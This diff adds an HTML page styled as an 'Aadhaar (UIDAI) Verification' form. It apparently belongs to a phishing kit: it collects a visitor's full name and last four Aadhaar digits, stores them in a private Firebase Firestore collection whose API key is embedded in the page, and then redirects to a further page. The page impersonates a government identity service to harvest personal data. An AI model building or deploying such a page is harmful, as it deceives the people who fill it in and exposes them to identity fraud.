@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Home</title>
+  <link rel="stylesheet" href="a02b572693328546.css" />
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+    // ✅ Updated Firebase Configuration (srai-16d20)
+    const firebaseConfig = {
+      apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+      authDomain: "srai-16d20.firebaseapp.com",
+      projectId: "srai-16d20",
+      storageBucket: "srai-16d20.firebaseapp.com",
+      messagingSenderId: "13015388512",
+      appId: "1:13015388512:web:ede30255ac370257f7ce05"
+    };
+
+    // 🔥 Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    console.log("🔥 Firestore initialized:", db);
+
+    async function handleFormSubmit(event) {
+      event.preventDefault();
+
+      const fullName = document.querySelector('input[name="fn"]').value.trim();
+      const aadhaarLastDigits = document.querySelector('input[name="adn"]').value.trim();
+
+      if (!fullName || !aadhaarLastDigits) {
+        alert("⚠ Please fill out all fields.");
+        return;
+      }
+
+      if (!/^[0-9]{4}$/.test(aadhaarLastDigits)) {
+        alert("⚠ Aadhaar last 4 digits must be numeric.");
+        return;
+      }
+
+      console.log("📤 Submitting:", { fullName, aadhaarLastDigits });
+
+      try {
+        const docRef = await addDoc(collection(db, "users"), {
+          fullName,
+          aadhaarLastDigits,
+          timestamp: serverTimestamp(),
+        });
+
+        console.log("✅ Data saved! Document ID:", docRef.id);
+        setTimeout(() => {
+          window.location.replace("b15.html");
+        }, 1000);
+
+      } catch (error) {
+        console.error("❌ Firestore Error:", error);
+        alert(`Error submitting data: ${error.message}`);
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("aadhaarForm");
+      if (form) {
+        form.addEventListener("submit", handleFormSubmit);
+        console.log("✅ Form event listener attached.");
+      } else {
+        console.error("❌ Form not found in DOM!");
+      }
+    });
+  </script>
+</head>
+<body>
+  <div id="__next">
+    <header>
+      <img alt="logo" width="509" height="99" src="logo.png" />
+    </header>
+    <main>
+      <form id="aadhaarForm">
+        <input type="hidden" name="formtoken" value="" />
+        <h1>Aadhaar (UIDAI) Verification</h1>
+
+        <div class="floating-container">
+          <input type="text" name="fn" placeholder=" " required />
+          <label>Full Name (as Per Aadhaar) <span>*</span></label>
+        </div>
+
+        <div class="floating-container">
+          <input type="text" name="adn" minlength="4" maxlength="4" inputmode="numeric" placeholder=" " required />
+          <label>Last 4-digit Aadhaar Number <span>*</span></label>
+        </div>
+
+        <div class="btContainer">
+          <button type="submit">Verify</button>
+        </div>
+      </form>
+    </main>
+
+    <footer>
+      <div class="l">
+        <img alt="footer" width="1080" height="769" src="s.jpg" />
+      </div>
+      <img alt="footer" width="1080" height="189" src="ft.png" />
+    </footer>
+  </div>
+</body>
+</html>
